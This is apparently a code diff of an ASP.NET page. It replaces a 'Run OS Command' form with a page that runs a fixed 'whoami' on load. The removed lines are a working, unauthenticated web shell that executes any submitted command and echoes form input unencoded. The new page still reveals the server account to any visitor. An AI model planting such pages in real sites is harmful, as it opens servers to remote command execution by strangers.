@@ -2,78 +2,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Run Command</title>
+    <title>Test WHOAMI Command</title>
     <style>
         body {
             font-family: Consolas, monospace;
             background: #f0f0f0;
             padding: 40px;
         }
-        textarea {
+        #outputBox {
+            background: #ffffff;
+            color: #000000;
             width: 100%;
-            height: 300px;
-            background: #fff;
-            color: #000;
+            height: 200px;
             padding: 10px;
-            white-space: pre;
             font-size: 14px;
+            border: 1px solid #ccc;
+            white-space: pre;
+            overflow: auto;
         }
     </style>
 </head>
 <body>
-    <h2>Run OS Command</h2>
-    <form method="post">
-        <label>Command:</label><br/>
-        <input type="text" name="cmd" value="<%= Request.Form["cmd"] %>" /><br/>
-        <label>Arguments:</label><br/>
-        <input type="text" name="args" value="<%= Request.Form["args"] %>" /><br/>
-        <button type="submit">Run</button>
-    </form>
-
-    <h3>Output:</h3>
-    <textarea readonly>
+    <h2>Test OS Command Output: <code>whoami</code></h2>
+    <div id="outputBox">
 <%
-    if (IsPostBack)
+    try
     {
-        string cmd = Request.Form["cmd"];
-        string args = Request.Form["args"];
+        string command = "whoami";
+        System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
+        psi.FileName = command;
+        psi.Arguments = "";
+        psi.RedirectStandardOutput = true;
+        psi.RedirectStandardError = true;
+        psi.UseShellExecute = false;
+        psi.CreateNoWindow = true;
 
-        Response.Write("Command: " + Server.HtmlEncode(cmd) + "\n");
-        Response.Write("Arguments: " + Server.HtmlEncode(args) + "\n\n");
-
-        if (string.IsNullOrWhiteSpace(cmd))
+        using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
         {
-            Response.Write("⚠️ No command entered. Defaulting to ipconfig.\n\n");
-            cmd = "ipconfig";
-            args = "";
-        }
+            string output = process.StandardOutput.ReadToEnd();
+            string error = process.StandardError.ReadToEnd();
+            process.WaitForExit();
 
-        try
-        {
-            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
-            psi.FileName = cmd;
-            psi.Arguments = args;
-            psi.RedirectStandardOutput = true;
-            psi.RedirectStandardError = true;
-            psi.UseShellExecute = false;
-            psi.CreateNoWindow = true;
-
-            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
-            {
-                string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
-
-                string full = output + (string.IsNullOrWhiteSpace(error) ? "" : "\n[ERROR]\n" + error);
-                Response.Write(Server.HtmlEncode(full));
-            }
-        }
-        catch (Exception ex)
-        {
-            Response.Write("ERROR: " + Server.HtmlEncode(ex.Message));
+            string fullOutput = output + (string.IsNullOrWhiteSpace(error) ? "" : "\n[ERROR]\n" + error);
+            Response.Write(Server.HtmlEncode(fullOutput));
         }
     }
+    catch (Exception ex)
+    {
+        Response.Write("<span style='color:red'>ERROR:</span><br/>" + Server.HtmlEncode(ex.ToString()));
+    }
 %>
-    </textarea>
+    </div>
 </body>
 </html>
